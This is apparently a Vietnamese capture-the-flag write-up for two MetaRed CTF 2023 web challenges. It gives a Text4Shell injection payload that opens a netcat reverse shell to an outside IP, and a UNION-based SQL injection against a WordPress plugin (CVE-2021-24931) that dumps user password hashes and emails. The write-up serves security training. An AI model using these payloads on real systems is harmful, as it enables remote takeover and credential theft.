# MetaRed CTF 2023 - Stage 5
# WEB - Text4Shell

- Về cơ bản, việc ta cần làm là tìm cách RCE thông qua param `?search` của trang web, ở đây mình sử dụng revershell

<img src="/assets/writeup/cookie/MetaRed CTF 2023 - Stage 5 e42a378f8c09464288274c527d70a42a/Untitled.png">
payload: `${java.lang.Runtime.getRuntime().exec('nc 65.21.156.52 4443 -e /bin/bash')}`

payload encode url: [`http://190.15.135.60/text4shell/attack?search=%24{script%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('nc 65.21.156.52 4443 -e %2Fbin%2Fbash')}`](http://190.15.135.60/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%2065.21.156.52%204443%20-e%20%2Fbin%2Fbash%27%29%7D) - **encode $ { }/ và ( )**

<img src="/assets/writeup/cookie/MetaRed CTF 2023 - Stage 5 e42a378f8c09464288274c527d70a42a/Untitled 1.png">

- `nc -lvnp 4443` : kết nối vào port 4443, sau đó lấy flag ^^

# WEB-WordPress

**[Wordpress Plugin Secure Copy Content Protection and Content Locking < 2.8.2 - SQL-Injection (Unauthenticated)](https://github.com/Hacker5preme/Exploits#wordpress-plugin-secure-copy-content-protection-and-content-locking--282---sql-injection-unauthenticated)**

**# CVE: CVE-2021-24931**

Plugin WordPress "The Secure Copy Content Protection and Content Locking" phiên bản trước 2.8.2 không thoát (escape) đúng tham số **`sccp_id`** của  AJAX **`ays_sccp_results_export_file`**. Hành động này có sẵn cho cả người dùng chưa xác thực và người dùng đã xác thực. Trước khi sử dụng giá trị **`sccp_id`** trong một câu lệnh SQL, plugin không thực hiện bước thoát thích hợp, dẫn đến một lỗ hổng SQL injection.

Lỗ hổng này có thể cho phép kẻ tấn công thực hiện các cuộc tấn công SQL Injection bằng cách chèn các câu lệnh SQL độc hại vào giá trị của **`sccp_id`**.

[https://www.exploit-db.com/exploits/50733](https://www.exploit-db.com/exploits/50733)

<img src="/assets/writeup/cookie/MetaRed CTF 2023 - Stage 5 e42a378f8c09464288274c527d70a42a/Untitled 2.png">

PAYLOAD: `3) union select 1,user_pass,user_email,2,2,2 from wp_users union select 1,1,1,1,1,1 FROM wp_ays_sccp_reports WHERE (1=1`

- Phần này đang thực hiện một tấn công SQL Injection bằng cách sử dụng UNION SELECT để nối kết quả từ hai truy vấn khác nhau.
- Đoạn **`select 1, user_pass, user_email, 2, 2, 2 from wp_users`** lấy thông tin mật khẩu (**`user_pass`**) và email (**`user_email`**) từ bảng **`wp_users`**.
- Đoạn **`select 1, 1, 1, 1, 1, 1 FROM wp_ays_sccp_reports WHERE (1 = 1)`** dùng để cân bằng các cột

payload url: `GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20union%20select%201,user_pass,user_email,2,2,2%20from%20wp_users%20union%20select%201,1,1,1,1,1%20FROM%20wp_ays_sccp_reports%20WHERE%20(1=1%20&type=json HTTP/1.1`

flag{$P$BsIu9jhV\/NIdvwjpaV8n0MeyhZgMmz0}
